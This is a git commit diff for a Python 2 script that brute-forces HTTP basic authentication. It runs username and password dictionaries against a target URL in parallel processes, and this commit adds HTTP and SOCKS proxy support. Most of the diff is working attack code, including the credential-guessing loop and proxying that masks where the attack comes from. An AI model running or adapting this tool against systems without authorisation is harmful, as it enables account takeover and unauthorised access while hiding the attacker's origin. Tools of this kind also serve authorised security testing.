2cfe99e07e93a3af1875fa620fffb2d80a27830d
C4rt <eric.c4rtman@gmail.com>
2013-07-19 11:48:20 +0200

    Update bruteAuthWebMultiProc.py
    add http proxy and socks proxy support

--- bruteAuthWebMultiProc.py
+++ bruteAuthWebMultiProc.py
@@ -3,18 +3,19 @@
 
 '''
 Small Multiprocessing python script to brute force web basic authentication
+with proxy http and socks proxy support.
 ...
 '''
 
 __author__ = "C4rt"
-__date__ = "18/07/2013"
+__date__ = "15/07/2013"
 __version__ = "1.0"
 __maintainer__ = "C4rt"
 __email__ = "eric.c4rtman@gmail.com"
 __status__ = "Production"
 
 try:
-    import requests
+    import requesocks
     import multiprocessing
     import Queue
     import optparse
@@ -25,7 +26,7 @@ except ImportError, err:
     sys.exit(1)
 
 
-def enumattempt(url, credqueue, validqueue):
+def enumattempt(url, credqueue, validqueue, proxy):
   print '[*] Starting new enum thread.'
   while True:
     try:
@@ -38,7 +39,11 @@ def enumattempt(url, credqueue, validqueue):
         print '[-] Success queue has credentials, quitting.'
         return
     try:
-        resp = requests.get(url, auth=(creds[0], creds[1]), verify=False)
+        #resp = requests.request('GET', url, auth=(creds[0], creds[1]), proxies=proxy)
+        s = requesocks.Session()
+        s.auth = (creds[0], creds[1])
+        s.proxies = proxy
+        resp = s.get(url)
         if resp.status_code == 200:
             print '[+] Success: {0} : {1}'.format(creds[0], creds[1])
             validqueue.put(creds)
@@ -50,18 +55,21 @@ def enumattempt(url, credqueue, validqueue):
 
 def main():
     parser = optparse.OptionParser(
-        "Usage: bruteAuthWeb.py -H <url> -u <user names file> -d <Password names file>")
+        "Usage: bruteAuthWeb.py -H <url> -u <user names file> -d <Password names file> -S <Proxy specification as socks5://host:port or http://user@passwordhost:port>")
     parser.add_option('-H', dest='tgtUrl', type='string',
                           help='specify target Url')
     parser.add_option('-u', dest='userfile', type='string',
                           help='specify dictionnary with login usernames')
     parser.add_option('-d', dest='passfile', type='string',
                           help='specify dictionnary with passwords')
+    parser.add_option('-S', dest='proxydef', type='string',
+                          help='specify proxy sock element as host:port')
     (options, args) = parser.parse_args()
 
     url = options.tgtUrl
     userfile = options.userfile
     passfile = options.passfile
+    prox = options.proxydef
 
     if url == None or userfile == None or passfile == None:
         print parser.usage
@@ -72,9 +80,13 @@ def main():
     procs = []
     usernames = open(userfile).read().splitlines()
     passnames = open(passfile).read().splitlines()
+    proxy={}
+    if prox:
+      proxy.update({'http': prox, 'https': prox})
+
     print "\nStarting enumeration\n======================"
     for c in range(multiprocessing.cpu_count()):
-      p = multiprocessing.Process(target=enumattempt, args=(url, credqueue, validqueue))
+      p = multiprocessing.Process(target=enumattempt, args=(url, credqueue, validqueue, proxy))
       procs.append(p)
       p.start()
 
